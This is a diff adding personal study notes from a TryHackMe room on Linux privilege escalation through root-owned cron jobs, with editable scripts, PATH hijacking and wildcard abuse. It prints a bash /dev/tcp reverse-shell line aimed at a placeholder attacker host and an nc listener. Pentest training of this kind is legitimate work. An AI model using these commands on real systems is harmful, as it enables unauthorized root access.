@@ -174,6 +174,45 @@ example syntax: getcap -r / 2>/dev/null
 [Note: When run as an unprivileged user, 'getcap -r /' will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.]
 ...GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[From: https://tryhackme.com/room/linprivesc ; Task 9 - Privilege Escalation: Cron Jobs (with editing, etc.)]
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+Cron job configurations are stored as crontabs (cron tables); [these tables show] the next time and date the task will run.
+
+Each user on the system [will] have their [own] crontab file [which will] run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.
+
+Any user can read the file keeping system-wide cron jobs under /etc/crontab
+
+While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.
+
+[If] our current user can access [a] script set to run [as a cron job], we can easily modify it to create a reverse shell, hopefully with root privileges.
+
+The script will use the tools available on the target system to launch a reverse shell.
+Two points to note:
+1) The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)
+2) We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
+-----------
+An example reverse shell script:
+#!/bin/bash
+bash -i >& /dev/tcp/<IP_ADDRESS_OF_ATTACK MACHINE>/<ATTACK_MACHINE'S_LISTENING_PORT> 0>&1
+
+On the attack machine we will open up a listening port to await the reverse shell:
+nc -nlvp <LISTENING_PORT>
+------------
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
+
+* System administrators need to run a script at regular intervals.
+* They create a cron job to do this
+* After a while, the script becomes useless, and they delete it
+* They do not clean the relevant cron job
+* This change management issue leads to a potential exploit leveraging cron jobs.
+
+If a script was deleted, but the cron job still exists and if the full path of the script is not defined ... cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script with the same name as the deleted script under our user’s home folder and it should be run by the cron job.
+
+In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]
 "In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
 For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes."
